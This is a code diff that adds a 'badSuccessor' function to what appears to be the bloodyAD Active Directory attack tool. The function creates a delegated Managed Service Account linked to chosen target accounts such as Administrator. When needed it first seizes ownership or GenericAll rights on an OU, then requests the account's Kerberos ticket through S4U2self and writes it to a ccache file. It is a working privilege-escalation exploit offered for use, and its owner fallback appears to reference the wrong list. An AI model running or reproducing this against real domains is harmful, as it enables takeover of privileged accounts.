@@ -15,6 +15,115 @@ from minikerberos.common import factory
 from minikerberos.protocol.external import ticketutil
 
 
+# TODO make it multi forest
+# TODO kerberos url should be adapted depending of credential provided
+# TODO print the previous keys stored in the Ticket
+def badSuccessor(conn, dmsa: str, t: list = [], ou: str = None):
+    """
+    Add a new DMSA (Dedicated Managed Service Account) object
+
+    :param dmsa: hostname of the DMSA object (no need to add '$')
+    :param t: Distinguished Name of the target whose privileges are to be assumed (can be called multiple times, e.g. "-t CN=Admin,CN=Users,DC=domain,DC=com -t CN=User,CN=Users,DC=domain,DC=com")
+    :param ou: Organizational Unit for the DMSA object. If not provided, chooses the first OU the logged user can add child to.
+    """
+    if not t:
+        raise BloodyError("No target provided, use -t to provide one")
+    print(t)
+    # Check if the schema version is 2025
+    schema_version = next(
+        conn.ldap.bloodysearch(
+            conn.ldap.schemaNC, attr=["objectVersion"]
+        )
+    ).get("objectVersion", None)
+
+    if int(schema_version[0]) < 91:
+        raise BloodyError("Schema version is not 2025. DMSA creation is not supported.")
+
+    # First we try to find a OU where we can add a child object
+    # If we don't find one, we will use the first one where we have DACL write on
+    # If we don't find one, we will use the first one where we have ownership write on
+    if not ou:
+        writable_ou = []
+        writable_nt_ou = []
+        writable_owner_ou = []
+        for entry in conn.ldap.bloodysearch(
+            conn.ldap.domainNC,
+            ldap_filter="(|(objectClass=container)(objectClass=organizationalUnit))",
+            search_scope=Scope.SUBTREE,
+            attr=["distinguishedName", "allowedChildClassesEffective", "sDRightsEffective"],
+        ):
+            sdright_mask = entry.get("sDRightsEffective", 0)
+            if "msDS-DelegatedManagedServiceAccount" in entry.get("allowedChildClassesEffective", []):
+                if entry["distinguishedName"] == "CN=Managed Service Accounts," + conn.ldap.domainNC:
+                    # Choose Managed Service Accounts in priority as it is the default for dMSA
+                    ou = entry["distinguishedName"]
+                    break
+                writable_ou.append(entry["distinguishedName"])
+            elif sdright_mask & 4:
+                # We have DACL write on the OU
+                writable_nt_ou.append(entry["distinguishedName"])
+            elif sdright_mask & 3:
+                # We have ownership write on the OU
+                writable_owner_ou.append(entry["distinguishedName"])
+
+        if not ou:
+            if writable_ou:
+                # Choose the first OU we can add child to
+                ou = writable_ou[0]
+            elif writable_nt_ou:
+                genericAll(conn, writable_nt_ou[0], conn.conf.username)
+            elif writable_owner_ou:
+                from bloodyAD.cli_modules import set as bloodySet
+                bloodySet.owner(conn, writable_nt_ou[0], conn.conf.username)
+                genericAll(conn, writable_nt_ou[0], conn.conf.username)
+            else:
+                raise BloodyError("No suitable OU found for adding the DMSA object")
+
+    dmsa_dn = f"CN={dmsa},{ou}"
+
+    new_sd = accesscontrol.createEmptySD()
+    access_mask = accesscontrol.ACCESS_FLAGS["GENERIC_ALL"]
+    self_obj = next(conn.ldap.bloodysearch(conn.ldap.domainNC,
+            ldap_filter=f"(sAMAccountName={conn.conf.username})",
+            search_scope=Scope.SUBTREE, attr=["objectSid"]))
+    self_dn = self_obj["distinguishedName"]
+    self_sid = self_obj["objectSid"]
+    utils.addRight(new_sd, self_sid, access_mask)
+
+    dmsa_sama = dmsa + "$"
+    from winacl.dtyp.security_descriptor import SECURITY_DESCRIPTOR
+    attr = {
+        "objectClass": ["msDS-DelegatedManagedServiceAccount"],
+        "sAMAccountName": dmsa+'$',
+        "dNSHostName": f"{dmsa}.{conn.conf.domain}",
+        "msDS-ManagedPasswordInterval": 30,
+        "msDS-GroupMSAMembership": SECURITY_DESCRIPTOR.from_sddl(f"O:S-1-5-32-544D:(A;;0xf01ff;;;{self_sid})"),
+        "msDS-DelegatedMSAState": 2,
+        "msDS-ManagedAccountPrecededByLink": t,
+        "msDS-SupportedEncryptionTypes": 0x1c,
+        "userAccountControl": 0x1000
+    }
+    conn.ldap.bloodyadd(dmsa_dn, attributes=attr)
+    LOG.info(f"[+] DMSA {dmsa_sama} created")
+
+    client = None
+    path = dmsa + "_" + "".join(
+            random.choice(string.ascii_letters + string.digits) for i in range(2)
+        )
+
+    url = f"kerberos+pw://{conn.conf.domain}\\{conn.conf.username}:{conn.conf.password}@{conn.conf.dcip}"
+    cu = factory.KerberosClientFactory.from_url(url)
+    client = cu.get_client_blocking()
+    from minikerberos.common.spn import KerberosSPN
+    service_spn = KerberosSPN.from_spn(f"krbtgt/{conn.conf.domain}@{conn.conf.domain}")
+    target_user = KerberosSPN.from_upn(f"{dmsa_sama}@{conn.conf.domain}")
+    tgs, encTGSRepPart, key = client.S4U2self(target_user, service_spn, is_dmsa=True)
+
+    ccache_path = path + ".ccache"
+    client.ccache.to_file(path + ".ccache")
+    LOG.info('[+] dMSA TGT stored in ccache file %s' % ccache_path)
+
+
 def computer(conn, hostname: str, newpass: str, ou: str = "DefaultOU", lifetime: int = 0):
     """
     Add new computer
